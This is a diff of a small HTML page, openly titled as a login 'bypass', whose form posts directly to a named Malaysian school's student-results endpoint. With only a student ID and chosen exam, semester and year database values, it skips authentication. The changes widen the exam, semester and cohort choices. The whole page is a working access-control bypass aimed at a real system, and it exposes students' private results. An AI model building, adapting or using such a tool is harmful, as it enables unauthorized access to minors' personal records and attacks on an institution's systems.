@@ -1,43 +1,61 @@
-<!DOCTYPE html>
-
-<!--Credit to Hakimifr-->
-
-<html lang="en">
-<head>
-    <link rel="stylesheet" href="index.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Quicksand&display=swap" rel="stylesheet">
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>login page bypass v2 by hakimi</title>
-</head>
-<body>
-    <div class="form-container">
-        <form class="hello" action="https://mrsmkualaklawang.edu.my/epelajar/KeputusanRedirect.asp" method="POST">
-            <label for="uname"><b>ID Pengguna</b></label>
-            <input name="hfNoMaktab" type="text" required id="hfNoMaktab" placeholder="Nombor Maktab">
+<!DOCTYPE html> 
+ 
+<!--Credit to Hakimifr--> 
+ 
+<html lang="en"> 
+<head> 
+    <link rel="stylesheet" href="index.css"> 
+    <link rel="preconnect" href="https://fonts.googleapis.com"> 
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> 
+    <link href="https://fonts.googleapis.com/css2?family=Quicksand&display=swap" rel="stylesheet"> 
+    <meta charset="UTF-8"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <title>Bypass system</title> 
+</head> 
+<body> 
+    <div class="form-container"> 
+        <form class="hello" action="https://mrsmkualaklawang.edu.my/epelajar/KeputusanRedirect.asp" method="POST"> 
+            <label for="uname"><b>ID Pengguna</b></label> 
+            <input name="hfNoMaktab" type="text" required id="hfNoMaktab" placeholder="Nombor Maktab"> 
+             
+            <!--<input name="cboPep" id="cboPep" type="hidden" value="Png"> -->
+            <!--<input name="cboSem" id="cboSem" type="hidden" value="6">--> 
+            <!--<input name="hfDbase" id="hfDbase" type="hidden" value="sppngmr2022">-->
             
-            <input name="cboPep" id="cboPep" type="hidden" value="Png">
-            
+            <select id="cboPep" name="cboPep">
+                <option value="u1">Ujian Formatif 1</option>
+                <option value="u2">Ujian Formatif 2</option>
+                <option value="Spm">Semester(Gred SPM)</option>
+                <option value="Png">Semester(Gred PNG)</option>
+                <option value="u4">Pra-Percubaan SPM</option>
+                <option value="Spm">Percubaan SPM</option>
+            </select>
+
+            <select id="cboSem" name="cboSem">
+                <option value="1">1</option>
+                <option value="2">2</option>
+                <option value="3">3</option>
+                <option value="4">4</option>
+                <option value="5">5</option>
+                <option value="6">6</option>
+            </select>
 
             <select id="hfDbase" name="hfDbase">
-                  <option value="sppngma2024">Form 3 2024</option>
-                  <option value="sppngma2024">Form 4 2024</option>
-            </select>
-            
-             <select id="cboSem" name="cboSem">
-                  <option value="1">Sem 1</option>
-                  <option value="2">SEM 2</option>
-            </select>
-            
-            <button id="btn" class="button11 button111" type="submit">Log In</button>
-        </form>
-    </div>
-    <footer>
-        <p><a style="text-decoration: none;" href="https://github.com/Kamski18/kamski18.github.io/tree/main/Bypass-system">Source Code</a></p>
-        <p>By <a style="text-decoration: none;" href="https://github.com/kamski18"><b>Kamski</b></a> (5 AB)</p>
-    </footer>
-    <script src="index.js"></script>
-</body>
+                <option value="sppngmr2022">Form 1 2022</option>
+                <option value="sppngmr2022">Form 2 2024</option>
+                <option value="sppngmr2022">Form 3 2024</option>
+                <option value="sppngma2024">Form 4 2024</option>
+          </select>
+
+
+             
+            <button id="btn" class="button11 button111" type="submit">Log In</button> 
+        </form> 
+    </div> 
+    <footer> 
+        <p><a style="text-decoration: none;" href="https://github.com/Kamski18/kamski18.github.io">Source Code</a></p> 
+        <p><a style="text-decoration: none;" href="https://github.com/Kamski18"><b>Kamski</b></a></p> 
+    </footer> 
+    <script src="index.js"></script> 
+</body> 
 </html>
